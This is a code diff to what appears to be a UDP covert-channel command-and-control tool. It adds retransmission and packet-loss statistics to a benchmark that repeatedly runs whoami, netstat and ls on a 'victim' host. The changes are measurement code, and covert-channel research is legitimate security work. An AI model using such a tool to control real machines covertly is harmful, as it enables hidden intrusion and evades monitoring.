@@ -14,6 +14,11 @@ from dnslib import DNSRecord
 
 COMMAND_READY = threading.Event()
 
+# --- Global Statistics Variables ---
+current_retransmissions = 0
+current_missing_packets = 0
+# -----------------------------------
+
 parser = argparse.ArgumentParser(description="UDBee - UDP Covert Channel Tool")
 #parser.add_argument("-ip", required=True, type=str, help="Target IP address, IPv4 only")
 parser.add_argument("--received-chunks", type=int, default=10, help="Received chunks size in KB unit, default is 10KB byte (make it low to avoid memory overflow)")
@@ -113,6 +118,12 @@ def timeout_checker():
                             missing_packets = check_missing_packets(current_buffer, expected_chunks)
                             if missing_packets:
                                 log_info(f"<ansiyellow>Received an incomplete response from the vicim, asking victim for {len(missing_packets)} missing packets</ansiyellow>")
+
+                                # [!!] Update Stats
+                                current_retransmissions += 1
+                                current_missing_packets += len(missing_packets)
+
+
                                 indices_str = ",".join(str(i) for i in missing_packets)
                                 msg = f"RESEND:{indices_str}"
                                 send_msg(msg, False)
@@ -270,12 +281,19 @@ def listener():
             pass
 
 def run_test(command_name, command_str, iterations, csv_writer):
+    global current_retransmissions, current_missing_packets
+    
     log_info(f"\n--- Starting Performance Test: '{command_name}' ({iterations} iterations) ---")
     timings_ms = []
     failures = 0
     
     for i in range(iterations):
         COMMAND_READY.clear()
+        
+        # [!!] Reset Stats for this iteration
+        current_retransmissions = 0
+        current_missing_packets = 0
+        
         start_time = time.perf_counter()
         
         send_msg(command_str, True)
@@ -286,13 +304,19 @@ def run_test(command_name, command_str, iterations, csv_writer):
         
         if not success:
             log_error(f"Iteration {i+1} FAILED (Timeout after 120s)")
-            csv_writer.writerow([command_name, i+1, "N/A", "TIMEOUT"])
+            csv_writer.writerow([command_name, i+1, "N/A", "TIMEOUT", current_retransmissions, current_missing_packets])
             failures += 1
         else:
             duration_ms = (end_time - start_time) * 1000
             timings_ms.append(duration_ms)
-            log_info(f"Iteration {i+1}/{iterations} complete: {duration_ms:.2f} ms")
-            csv_writer.writerow([command_name, i+1, f"{duration_ms:.4f}", "SUCCESS"])
+            
+            # Log status with retransmission info
+            status_msg = f"Iteration {i+1}/{iterations} complete: {duration_ms:.2f} ms"
+            if current_retransmissions > 0:
+                status_msg += f" | Retries: {current_retransmissions} | Lost Pkts: {current_missing_packets}"
+            log_info(status_msg)
+
+            csv_writer.writerow([command_name, i+1, f"{duration_ms:.4f}", "SUCCESS", current_retransmissions, current_missing_packets])
         
         time.sleep(0.5)
 
@@ -314,33 +338,30 @@ def run_test(command_name, command_str, iterations, csv_writer):
 def main_test_harness():
     log_info("--- [!!] STARTING AUTOMATED PERFORMANCE TEST HARNESS [!!] ---")
     
-    csv_filename = f"performance_results_fs_{time.strftime('%Y%m%d-%H%M%S')}.csv"
+    csv_filename = f"performance_results_ssk_stats_{time.strftime('%Y%m%d-%H%M%S')}.csv"
     log_info(f"Saving test results to: {csv_filename}")
     
     with open(csv_filename, 'w', newline='') as f:
         writer = csv.writer(f)
-        writer.writerow(["TestName", "Iteration", "Duration_ms", "Status"])
+        writer.writerow(["TestName", "Iteration", "Duration_ms", "Status", "Retransmission_Count", "Total_Missing_Packets"])
+
         run_test(
             command_name="Light (whoami)",
             command_str="whoami",
             iterations=500,
             csv_writer=writer
         )
+        
         run_test(
             command_name="Medium (netstat -antup)",
             command_str="netstat -antup",
             iterations=500,
             csv_writer=writer
         )
+        
         run_test(
-            command_name="Heavy (netstat -ano)",
-            command_str="netstat -ano",
-            iterations=500,
-            csv_writer=writer
-        )
-        run_test(
-            command_name="Very Heavy (ls -lR /usr/bin 2>/dev/null | head -n 1000)",
-            command_str="ls -lR /usr/bin 2>/dev/null | head -n 1000",
+            command_name="Heavy (ls -lR /usr/bin)",
+            command_str="ls -lR /usr/bin 2>/dev/null | head -n 2000",
             iterations=500,
             csv_writer=writer
         )
@@ -348,7 +369,6 @@ def main_test_harness():
     log_success("--- [!!] ALL PERFORMANCE TESTS COMPLETE [!!] ---")
     log_info(f"Results saved to {csv_filename}")
     log_info("Test harness finished. Returning to interactive shell.")
-
 
 
 def main():
